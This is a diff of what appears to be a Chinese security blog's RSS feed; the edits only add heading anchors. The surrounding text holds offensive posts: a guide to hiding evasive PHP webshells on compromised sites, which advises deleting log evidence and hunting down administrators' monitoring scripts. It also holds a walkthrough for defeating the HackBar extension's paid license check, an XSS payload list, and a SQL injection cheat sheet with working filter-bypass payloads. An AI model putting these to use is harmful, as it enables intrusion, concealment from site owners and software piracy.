@@ -3,11 +3,11 @@
 这个公众号的文章质量都非常高，推荐大家关注</p>
 </blockquote>
 <p>拿下一个站后总希望自己的后门能够很隐蔽！不让网站管理员或者其他的Hacker发现，网上关于隐藏后门的方法也很多，如加密、包含，解析漏洞、加隐藏系统属性等等，但大部分已经都不实用了，随便找一个查马的程序就能很快的查出来，下面分享我总结的一些经验：</p>
-<h2 id="制作免杀webshell">制作免杀webshell</h2>
+<h2 id="制作免杀webshell"><a href="#制作免杀webshell" class="header-mark headerLink">制作免杀webshell</a></h2>
 <p>隐藏webshell最主要的就是做免杀，免杀做好了，你可以把webshell放在函数库文件中或者在图片马中，太多地方可以放了，只要查杀工具查不到，你的这个webshell就能存活很长时间，毕竟管理员也没有那么多精力挨个代码去查看。</p>
-<h3 id="命令执行的方法">命令执行的方法</h3>
+<h3 id="命令执行的方法"><a href="#命令执行的方法" class="header-mark headerLink">命令执行的方法</a></h3>
 <p>这里使用我们最常用的php的一句话马来给大家做演示，PHP版本是5.6的，在写一句话马之前我们来先分析一下PHP执行命令方法</p>
-<h4 id="直接执行">直接执行</h4>
+<h4 id="直接执行"><a href="#直接执行" class="header-mark headerLink">直接执行</a></h4>
 <p>使用php函数直接运行命令,常见的函数有(eval、system、assert)等，可以直接调用命令执行。</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -29,7 +29,7 @@
         
     
 </p>
-<h4 id="动态函数执行">动态函数执行</h4>
+<h4 id="动态函数执行"><a href="#动态函数执行" class="header-mark headerLink">动态函数执行</a></h4>
 <p>我们先把一个函数名当成一个字符串传递给一个变量，在使用变量当作函数去执行</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -51,7 +51,7 @@
         
     
 </p>
-<h4 id="文件包含执行">文件包含执行</h4>
+<h4 id="文件包含执行"><a href="#文件包含执行" class="header-mark headerLink">文件包含执行</a></h4>
 <p>有两个php文件，我们把执行命令的放在文件b中，使用文件a去包含，达到执行的效果</p>
 <p>b.php</p>
 <div class="highlight"><div class="chroma">
@@ -87,7 +87,7 @@
         
     
 </p>
-<h3 id="回调函数">回调函数</h3>
+<h3 id="回调函数"><a href="#回调函数" class="header-mark headerLink">回调函数</a></h3>
 <p>将想要执行命令的函数赋值给一个变量，再用一个可以调用函数执行的函数把变量解析成函数，这么说可能有点绕，看一下array_map函数的用法：array_map函数中将$arr每个元素传给func函数去执行，例子：</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -115,7 +115,7 @@
         
     
 </p>
-<h3 id="php-curly-syntax">PHP Curly Syntax</h3>
+<h3 id="php-curly-syntax"><a href="#php-curly-syntax" class="header-mark headerLink">PHP Curly Syntax</a></h3>
 <p>我们可以理解为字符串中掺杂了变量，再使用变量去拼接字符串，达到命令执行的效果</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -141,7 +141,7 @@
         
     
 </p>
-<h3 id="php反序列化">php反序列化</h3>
+<h3 id="php反序列化"><a href="#php反序列化" class="header-mark headerLink">php反序列化</a></h3>
 <p>这是根据php反序列化漏洞来实现命令执行，可以先创建一个反序列化的漏洞文件，再去调用反序列化函数unserialize</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -177,7 +177,7 @@
         
     
 </p>
-<h3 id="phpinput方法">php://input方法</h3>
+<h3 id="phpinput方法"><a href="#phpinput方法" class="header-mark headerLink">php://input方法</a></h3>
 <p>php://input可以访问请求的原始数据的只读流，我们可以理解为我们传post参数，php://input会读取到，这时候我们就可以加以利用了。</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -201,7 +201,7 @@
         
     
 </p>
-<h3 id="preg_replace方法">preg_replace方法</h3>
+<h3 id="preg_replace方法"><a href="#preg_replace方法" class="header-mark headerLink">preg_replace方法</a></h3>
 <p>preg_replace函数执行一个正则表达式的搜索和替换。我们可以使用一个命令执行函数去替换正常的字符串，然后去执行命令。</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -225,7 +225,7 @@
         
     
 </p>
-<h3 id="ob_start">ob_start</h3>
+<h3 id="ob_start"><a href="#ob_start" class="header-mark headerLink">ob_start</a></h3>
 <p>ob_start函数是打开输出控制缓冲，传入的参数会在使用ob_end_flush函数的时候去调用它执行输出在缓冲区的东西。</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -255,7 +255,7 @@
         
     
 </p>
-<h2 id="编写免杀">编写免杀</h2>
+<h2 id="编写免杀"><a href="#编写免杀" class="header-mark headerLink">编写免杀</a></h2>
 <p>上面说了那么多其实都是一句话木马的思路，每一种方式都可以写成一句话木马，而想要免杀常常会多种组合到一起，下面从最简单的木马一步步变形，达到免杀的目的。</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -534,7 +534,7 @@
         
     
 </p>
-<h2 id="更好的隐藏webshell一些建议">更好的隐藏webshell一些建议</h2>
+<h2 id="更好的隐藏webshell一些建议"><a href="#更好的隐藏webshell一些建议" class="header-mark headerLink">更好的隐藏webshell一些建议</a></h2>
 <ol>
 <li>
 <p>拿到权限以后,把网站日志中的所有关于webshell的访问记录和渗透时造成的一些网站报错记录全部删除</p>
@@ -579,7 +579,7 @@
 <p>在有权限的情况,看看管理员是否写的有动态webshell监测脚本,务必把脚本找出来,crontab一般都能看见了</p>
 </li>
 </ol>
-]]></description></item><item><title>HackBar破解</title><link>https://zu1k.com/posts/security/web-security/hack-hackbar/</link><pubDate>Sun, 22 Mar 2020 10:11:42 +0800</pubDate><author>zu1k</author><guid>https://zu1k.com/posts/security/web-security/hack-hackbar/</guid><description><![CDATA[<h2 id="前言">前言</h2>
+]]></description></item><item><title>HackBar破解</title><link>https://zu1k.com/posts/security/web-security/hack-hackbar/</link><pubDate>Sun, 22 Mar 2020 10:11:42 +0800</pubDate><author>zu1k</author><guid>https://zu1k.com/posts/security/web-security/hack-hackbar/</guid><description><![CDATA[<h2 id="前言"><a href="#前言" class="header-mark headerLink">前言</a></h2>
 <p>相信很多研究安全或者打CTF的朋友都在使用HackBar，在浏览器中使用HackBar构造并发送请求非常方便，特别是测试SQL注入和XSS等常见漏洞。</p>
 <p>但是HackBar是收费软件，在其 <a href="https://hackbar.site/" target="_blank" rel="noopener noreffer" class="post-link">官网</a> 上，价格由3刀到89刀不等。很多安全研究人员会选择购买89刀的10年证书，但是对于学生来说，短期的一个月1刀的短期价格对于这样一个浏览器插件来说还是比较贵的。</p>
 <p>
@@ -609,8 +609,8 @@
     
 </p>
 <p>下面我将以Chrome浏览器为例，对HackBar插件进行破解。</p>
-<h2 id="破解插件">破解插件</h2>
-<h3 id="找到插件路径">找到插件路径</h3>
+<h2 id="破解插件"><a href="#破解插件" class="header-mark headerLink">破解插件</a></h2>
+<h3 id="找到插件路径"><a href="#找到插件路径" class="header-mark headerLink">找到插件路径</a></h3>
 <p>首先我们需要在官网上找到插件的安装地址并进行安装</p>
 <p>
 
@@ -652,7 +652,7 @@
     
 </p>
 <p>我们可以在扩展程序界面看到所有插件的ID，找到HackBar的ID，然后从Extension目录中找到这个目录，进入后就是HackBar的插件目录</p>
-<h3 id="分析授权验证">分析授权验证</h3>
+<h3 id="分析授权验证"><a href="#分析授权验证" class="header-mark headerLink">分析授权验证</a></h3>
 <p>我们先将插件这个目录复制出来，然后用编辑器打开，其中授权验证相关代码在 <code>theme\js\hackbar-panel.js</code> 这个js文件中</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -770,7 +770,7 @@
 </span></span><span class="line"><span class="cl"><span class="p">}</span>
 </span></span></code></pre></td></tr></table>
 </div>
-</div><h3 id="进行破解">进行破解</h3>
+</div><h3 id="进行破解"><a href="#进行破解" class="header-mark headerLink">进行破解</a></h3>
 <p>通过上面对授权验证代码的分析，我们可以找到很多破解的思路，核心有一下几点：</p>
 <ul>
 <li><code>license_ok</code> 一开始是 <code>true</code></li>
@@ -794,7 +794,7 @@
 <blockquote>
 <p>我不会直接给出破解后的代码和插件的，希望大家能够根据上面的分析和破解思路自己进行破解</p>
 </blockquote>
-<h2 id="插件安装">插件安装</h2>
+<h2 id="插件安装"><a href="#插件安装" class="header-mark headerLink">插件安装</a></h2>
 <p>近年来，通过浏览器插件对用户进行攻击、获取用户隐私信息的攻击越来越多，现代浏览器厂商为了保护用户的安全，往往会对发布的浏览器插件进行严格审查，对未经签名验证的插件不予安装或安装后无法运行</p>
 <p>所以我们破解后的HackBar是无法通过正常途径安装的，我们需要通过开发者模式进行安装</p>
 <p>在扩展程序页面右上角打开 开发者模式，这样就可以不经签名安装自己开发的插件</p>
@@ -829,7 +829,7 @@
         
     
 </p>
-<h2 id="总结">总结</h2>
+<h2 id="总结"><a href="#总结" class="header-mark headerLink">总结</a></h2>
 <p>本文以HackBar的chrome插件的分析破解为例，想大家展示了浏览器插件的简单破解，Firefox的插件破解也是大同小异，希望大家可以活学活用</p>
 ]]></description></item><item><title>XSS payload</title><link>https://zu1k.com/posts/security/web-security/xss-payload/</link><pubDate>Sun, 14 Oct 2018 18:11:03 +0800</pubDate><author>zu1k</author><guid>https://zu1k.com/posts/security/web-security/xss-payload/</guid><description><![CDATA[<p>总结了常用的XSS payload</p>
 <p>1.普通的XSS JavaScript注入</p>
@@ -1080,8 +1080,8 @@ s878926199a
 <blockquote>
 <p>2020.08.08更新：增加利用MySQL8.0语法新特性绕过方法，增加SQL注入过滤和检测的几种思路和绕过方法</p>
 </blockquote>
-<h2 id="过滤空格">过滤空格</h2>
-<h3 id="使用注释符绕过">使用注释符<code>/**/</code>绕过</h3>
+<h2 id="过滤空格"><a href="#过滤空格" class="header-mark headerLink">过滤空格</a></h2>
+<h3 id="使用注释符绕过"><a href="#使用注释符绕过" class="header-mark headerLink">使用注释符<code>/**/</code>绕过</a></h3>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
@@ -1090,7 +1090,7 @@ s878926199a
 <pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">SELECT</span><span class="cm">/**/</span><span class="n">name</span><span class="cm">/**/</span><span class="k">FROM</span><span class="cm">/**/</span><span class="k">table</span><span class="w">
 </span></span></span></code></pre></td></tr></table>
 </div>
-</div><h3 id="使用url编码绕过">使用<strong>url编码</strong>绕过</h3>
+</div><h3 id="使用url编码绕过"><a href="#使用url编码绕过" class="header-mark headerLink">使用<strong>url编码</strong>绕过</a></h3>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
@@ -1099,7 +1099,7 @@ s878926199a
 <pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">%</span><span class="n">a0</span><span class="w"> </span><span class="err">发出去就是空格的意思，但是需要在</span><span class="n">burp中抓包后修改</span><span class="w">
 </span></span></span></code></pre></td></tr></table>
 </div>
-</div><h3 id="使用浮点数绕过">使用<strong>浮点数</strong>绕过</h3>
+</div><h3 id="使用浮点数绕过"><a href="#使用浮点数绕过" class="header-mark headerLink">使用<strong>浮点数</strong>绕过</a></h3>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
@@ -1112,9 +1112,9 @@ s878926199a
 </span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">id</span><span class="o">=</span><span class="mi">8</span><span class="p">.</span><span class="mi">0</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="w">
 </span></span></span></code></pre></td></tr></table>
 </div>
-</div><h3 id="使用tab替代空格">使用<strong>Tab</strong>替代空格</h3>
-<h3 id="使用两个空格替代一个空格">使用<strong>两个空格</strong>替代一个空格</h3>
-<h3 id="使用括号绕过">使用<strong>括号</strong>绕过</h3>
+</div><h3 id="使用tab替代空格"><a href="#使用tab替代空格" class="header-mark headerLink">使用<strong>Tab</strong>替代空格</a></h3>
+<h3 id="使用两个空格替代一个空格"><a href="#使用两个空格替代一个空格" class="header-mark headerLink">使用<strong>两个空格</strong>替代一个空格</a></h3>
+<h3 id="使用括号绕过"><a href="#使用括号绕过" class="header-mark headerLink">使用<strong>括号</strong>绕过</a></h3>
 <p>如果空格被过滤，括号没有被过滤，可以用括号绕过。
 在MySQL中，括号是用来包围子查询的。因此，任何可以计算出结果的语句，都可以用括号包围起来。而括号的两端，可以没有多余的空格。</p>
 <p>例如：</p>
@@ -1135,8 +1135,8 @@ s878926199a
 <pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="o">%</span><span class="mi">27</span><span class="k">and</span><span class="p">(</span><span class="n">sleep</span><span class="p">(</span><span class="n">ascii</span><span class="p">(</span><span class="n">mid</span><span class="p">(</span><span class="k">database</span><span class="p">()</span><span class="k">from</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="k">for</span><span class="p">(</span><span class="mi">1</span><span class="p">)))</span><span class="o">=</span><span class="mi">109</span><span class="p">))</span><span class="o">%</span><span class="mi">23</span><span class="w">
 </span></span></span></code></pre></td></tr></table>
 </div>
-</div><h2 id="过滤引号">过滤引号</h2>
-<h3 id="使用16进制绕过">使用<strong>16进制</strong>绕过</h3>
+</div><h2 id="过滤引号"><a href="#过滤引号" class="header-mark headerLink">过滤引号</a></h2>
+<h3 id="使用16进制绕过"><a href="#使用16进制绕过" class="header-mark headerLink">使用<strong>16进制</strong>绕过</a></h3>
 <p>会使用到引号的地方一般是在最后的where子句中。如下面的一条SQL语句，这条语句就是一个简单的用来查选得到users表中所有字段的一条语句：</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -1156,8 +1156,8 @@ s878926199a
 <pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">select</span><span class="w"> </span><span class="k">column_name</span><span class="w">  </span><span class="k">from</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="k">table_name</span><span class="o">=</span><span class="mi">0</span><span class="n">x7573657273</span><span class="w">
 </span></span></span></code></pre></td></tr></table>
 </div>
-</div><h2 id="过滤逗号">过滤逗号</h2>
-<h3 id="使用from关键字绕过">使用<strong>from关键字</strong>绕过</h3>
+</div><h2 id="过滤逗号"><a href="#过滤逗号" class="header-mark headerLink">过滤逗号</a></h2>
+<h3 id="使用from关键字绕过"><a href="#使用from关键字绕过" class="header-mark headerLink">使用<strong>from关键字</strong>绕过</a></h3>
 <p>对于<code>substr()</code>和<code>mid()</code>这两个方法可以使用<code>from to</code>的方式来解决：</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -1169,7 +1169,7 @@ s878926199a
 </span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">select</span><span class="w"> </span><span class="n">mid</span><span class="p">(</span><span class="k">database</span><span class="p">()</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="mi">1</span><span class="p">);</span><span class="w">
 </span></span></span></code></pre></td></tr></table>
 </div>
-</div><h3 id="使用join关键字绕过">使用<strong>join关键字</strong>绕过</h3>
+</div><h3 id="使用join关键字绕过"><a href="#使用join关键字绕过" class="header-mark headerLink">使用<strong>join关键字</strong>绕过</a></h3>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
@@ -1182,7 +1182,7 @@ s878926199a
 </span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">union</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="p">(</span><span class="k">select</span><span class="w"> </span><span class="mi">1</span><span class="p">)</span><span class="n">a</span><span class="w"> </span><span class="k">join</span><span class="w"> </span><span class="p">(</span><span class="k">select</span><span class="w"> </span><span class="mi">2</span><span class="p">)</span><span class="n">b</span><span class="w">
 </span></span></span></code></pre></td></tr></table>
 </div>
-</div><h3 id="使用like关键字绕过">使用<strong>like关键字</strong>绕过</h3>
+</div><h3 id="使用like关键字绕过"><a href="#使用like关键字绕过" class="header-mark headerLink">使用<strong>like关键字</strong>绕过</a></h3>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
@@ -1193,7 +1193,7 @@ s878926199a
 </span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">select</span><span class="w"> </span><span class="k">user</span><span class="p">()</span><span class="w"> </span><span class="k">like</span><span class="w"> </span><span class="s1">&#39;r%&#39;</span><span class="w">
 </span></span></span></code></pre></td></tr></table>
 </div>
-</div><h3 id="使用offset关键字绕过">使用<strong>offset关键字</strong>绕过</h3>
+</div><h3 id="使用offset关键字绕过"><a href="#使用offset关键字绕过" class="header-mark headerLink">使用<strong>offset关键字</strong>绕过</a></h3>
 <p>对于limit可以使用offset来绕过：</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -1207,8 +1207,8 @@ s878926199a
 </span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">news</span><span class="w"> </span><span class="k">limit</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="k">offset</span><span class="w"> </span><span class="mi">0</span><span class="w">
 </span></span></span></code></pre></td></tr></table>
 </div>
-</div><h2 id="过滤注释符--和----">过滤注释符（ <code>#</code> 和 <code>--</code> ）</h2>
-<h3 id="手动闭合引号不使用注释符">手动闭合引号，不使用注释符</h3>
+</div><h2 id="过滤注释符--和----"><a href="#过滤注释符--和----" class="header-mark headerLink">过滤注释符（ <code>#</code> 和 <code>--</code> ）</a></h2>
+<h3 id="手动闭合引号不使用注释符"><a href="#手动闭合引号不使用注释符" class="header-mark headerLink">手动闭合引号，不使用注释符</a></h3>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
@@ -1226,8 +1226,8 @@ s878926199a
 <pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">&#39; union select 1,2,&#39;</span><span class="mi">3</span><span class="w">
 </span></span></span></code></pre></td></tr></table>
 </div>
-</div><h2 id="过滤比较符号---和--">过滤比较符号 （ <code>&lt;</code> 和 <code>&gt;</code> ）</h2>
-<h3 id="使用greatestleast函数绕过">使用**<code>greatest()</code>、<code>least（）</code>函数**绕过</h3>
+</div><h2 id="过滤比较符号---和--"><a href="#过滤比较符号---和--" class="header-mark headerLink">过滤比较符号 （ <code>&lt;</code> 和 <code>&gt;</code> ）</a></h2>
+<h3 id="使用greatestleast函数绕过"><a href="#使用greatestleast函数绕过" class="header-mark headerLink">使用**<code>greatest()</code>、<code>least（）</code>函数**绕过</a></h3>
 <p>greatest()、least（）：（前者返回最大值，后者返回最小值）</p>
 <p>同样是在使用盲注的时候，在使用二分查找的时候需要使用到比较操作符来进行查找。如果无法使用比较操作符，那么就需要使用到greatest来进行绕过了</p>
 <p>最常见的一个盲注的SQL语句：</p>
@@ -1249,12 +1249,12 @@ s878926199a
 <pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="n">greatest</span><span class="p">(</span><span class="n">ascii</span><span class="p">(</span><span class="n">substr</span><span class="p">(</span><span class="k">database</span><span class="p">(),</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">)),</span><span class="mi">64</span><span class="p">)</span><span class="o">=</span><span class="mi">64</span><span class="w">
 </span></span></span></code></pre></td></tr></table>
 </div>
-</div><h3 id="使用between-and绕过">使用**<code>between</code> <code>and</code>**绕过</h3>
+</div><h3 id="使用between-and绕过"><a href="#使用between-and绕过" class="header-mark headerLink">使用**<code>between</code> <code>and</code>**绕过</a></h3>
 <p>between a and b：返回a，b之间的数据，不包含b。</p>
-<h2 id="过滤等号--">过滤等号（ <code>=</code> ）</h2>
-<h3 id="使用like-rlike-regexp-或者-使用-或者-">使用like 、rlike 、regexp 或者 使用&lt; 或者 &gt;</h3>
-<h2 id="过滤or-and-xor-not">过滤<code>or</code> <code>and</code> <code>xor</code> <code>not</code></h2>
-<h3 id="使用符号代替">使用符号代替</h3>
+<h2 id="过滤等号--"><a href="#过滤等号--" class="header-mark headerLink">过滤等号（ <code>=</code> ）</a></h2>
+<h3 id="使用like-rlike-regexp-或者-使用-或者-"><a href="#使用like-rlike-regexp-或者-使用-或者-" class="header-mark headerLink">使用like 、rlike 、regexp 或者 使用&lt; 或者 &gt;</a></h3>
+<h2 id="过滤or-and-xor-not"><a href="#过滤or-and-xor-not" class="header-mark headerLink">过滤<code>or</code> <code>and</code> <code>xor</code> <code>not</code></a></h2>
+<h3 id="使用符号代替"><a href="#使用符号代替" class="header-mark headerLink">使用符号代替</a></h3>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
@@ -1263,8 +1263,8 @@ s878926199a
 <pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">and</span><span class="o">=`&amp;&amp;`</span><span class="w">  </span><span class="k">or</span><span class="o">=`||`</span><span class="w">   </span><span class="n">xor</span><span class="o">=`|`</span><span class="w">   </span><span class="k">not</span><span class="o">=`!`</span><span class="w">
 </span></span></span></code></pre></td></tr></table>
 </div>
-</div><h2 id="过滤unionselectwhere等">过滤<code>union</code>，<code>select</code>，<code>where</code>等</h2>
-<h3 id="使用注释符绕过-1">使用<strong>注释符</strong>绕过</h3>
+</div><h2 id="过滤unionselectwhere等"><a href="#过滤unionselectwhere等" class="header-mark headerLink">过滤<code>union</code>，<code>select</code>，<code>where</code>等</a></h2>
+<h3 id="使用注释符绕过-1"><a href="#使用注释符绕过-1" class="header-mark headerLink">使用<strong>注释符</strong>绕过</a></h3>
 <p>常用注释符：</p>
 <p><code>//</code>、<code>--</code>、<code>/**/</code>、<code>#</code>、<code>--+</code>、<code>---</code>、<code>;</code>、<code>%00</code>、<code>--a</code></p>
 <p>用法：</p>
@@ -1276,7 +1276,7 @@ s878926199a
 <pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="n">U</span><span class="cm">/**/</span><span class="w"> </span><span class="n">NION</span><span class="w"> </span><span class="cm">/**/</span><span class="w"> </span><span class="n">SE</span><span class="cm">/**/</span><span class="w"> </span><span class="n">LECT</span><span class="w"> </span><span class="cm">/**/</span><span class="k">user</span><span class="err">，</span><span class="n">pwd</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="k">user</span><span class="w">
 </span></span></span></code></pre></td></tr></table>
 </div>
-</div><h3 id="使用大小写绕过">使用<strong>大小写</strong>绕过</h3>
+</div><h3 id="使用大小写绕过"><a href="#使用大小写绕过" class="header-mark headerLink">使用<strong>大小写</strong>绕过</a></h3>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
@@ -1285,7 +1285,7 @@ s878926199a
 <pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="n">id</span><span class="o">=-</span><span class="mi">1</span><span class="s1">&#39;UnIoN/**/SeLeCT
 </span></span></span></code></pre></td></tr></table>
 </div>
-</div><h3 id="使用内联注释绕过">使用<strong>内联注释</strong>绕过</h3>
+</div><h3 id="使用内联注释绕过"><a href="#使用内联注释绕过" class="header-mark headerLink">使用<strong>内联注释</strong>绕过</a></h3>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
@@ -1294,7 +1294,7 @@ s878926199a
 <pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="n">id</span><span class="o">=-</span><span class="mi">1</span><span class="s1">&#39;/*!UnIoN*/ SeLeCT 1,2,concat(/*!table_name*/) FrOM /*information_schema*/.tables /*!WHERE *//*!TaBlE_ScHeMa*/ like database()#
 </span></span></span></code></pre></td></tr></table>
 </div>
-</div><h3 id="使用双关键字绕过若删除掉第一个匹配的union就能绕过">使用<strong>双关键字</strong>绕过（若删除掉第一个匹配的union就能绕过）</h3>
+</div><h3 id="使用双关键字绕过若删除掉第一个匹配的union就能绕过"><a href="#使用双关键字绕过若删除掉第一个匹配的union就能绕过" class="header-mark headerLink">使用<strong>双关键字</strong>绕过（若删除掉第一个匹配的union就能绕过）</a></h3>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
@@ -1303,7 +1303,7 @@ s878926199a
 <pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="n">id</span><span class="o">=-</span><span class="mi">1</span><span class="s1">&#39;UNIunionONSeLselectECT1,2,3–-
 </span></span></span></code></pre></td></tr></table>
 </div>
-</div><h3 id="使用加号拆解字符串">使用<strong>加号+拆解字符串</strong></h3>
+</div><h3 id="使用加号拆解字符串"><a href="#使用加号拆解字符串" class="header-mark headerLink">使用<strong>加号+拆解字符串</strong></a></h3>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
@@ -1312,9 +1312,9 @@ s878926199a
 <pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">or</span><span class="w"> </span><span class="err">‘</span><span class="n">swords</span><span class="err">’</span><span class="w"> </span><span class="o">=</span><span class="err">‘</span><span class="n">sw</span><span class="err">’</span><span class="w"> </span><span class="o">+</span><span class="err">’</span><span class="w"> </span><span class="n">ords</span><span class="err">’</span><span class="w"> </span><span class="err">；</span><span class="k">EXEC</span><span class="p">(</span><span class="err">‘</span><span class="k">IN</span><span class="err">’</span><span class="w"> </span><span class="o">+</span><span class="err">’</span><span class="w"> </span><span class="n">SERT</span><span class="w"> </span><span class="k">INTO</span><span class="w"> </span><span class="err">‘</span><span class="o">+</span><span class="err">’</span><span class="w"> </span><span class="err">…</span><span class="p">..</span><span class="err">’</span><span class="w"> </span><span class="p">)</span><span class="w">
 </span></span></span></code></pre></td></tr></table>
 </div>
-</div><h3 id="使用语法新特性绕过屏蔽select">使用语法新特性绕过屏蔽select</h3>
+</div><h3 id="使用语法新特性绕过屏蔽select"><a href="#使用语法新特性绕过屏蔽select" class="header-mark headerLink">使用语法新特性绕过屏蔽select</a></h3>
 <p>在MySQL 8.0.19版本后，MySQL推出了一些新特性，使我们可以不使用select就能够取数据</p>
-<h4 id="table-语句">TABLE 语句</h4>
+<h4 id="table-语句"><a href="#table-语句" class="header-mark headerLink">TABLE 语句</a></h4>
 <p>可以直接列出表的全部内容</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -1325,7 +1325,7 @@ s878926199a
 </span></span></span></code></pre></td></tr></table>
 </div>
 </div><p>如 <code>select * from user</code> 就可以用 <code>table user</code> 替代来进行绕过</p>
-<h4 id="values-语句">VALUES 语句</h4>
+<h4 id="values-语句"><a href="#values-语句" class="header-mark headerLink">VALUES 语句</a></h4>
 <p>可以列出一行的值</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -1365,10 +1365,10 @@ s878926199a
 </div><blockquote>
 <p>VALUES和TABLES语句的结果都是表数据，可以结合起来使用</p>
 </blockquote>
-<h2 id="使用编码绕过过滤">使用<strong>编码</strong>绕过过滤</h2>
+<h2 id="使用编码绕过过滤"><a href="#使用编码绕过过滤" class="header-mark headerLink">使用<strong>编码</strong>绕过过滤</a></h2>
 <p>如<code>URLEncode</code>编码，<code>ASCII</code>,<code>HEX</code>,<code>unicode</code>编码绕过</p>
 <p><code>or 1=1</code>即<code>%6f%72%20%31%3d%31</code>，而<code>Test</code>也可以为<code>CHAR(101)+CHAR(97)+CHAR(115)+CHAR(116)</code></p>
-<h2 id="使用等价函数绕过过滤">使用<strong>等价函数</strong>绕过过滤</h2>
+<h2 id="使用等价函数绕过过滤"><a href="#使用等价函数绕过过滤" class="header-mark headerLink">使用<strong>等价函数</strong>绕过过滤</a></h2>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
@@ -1413,11 +1413,11 @@ s878926199a
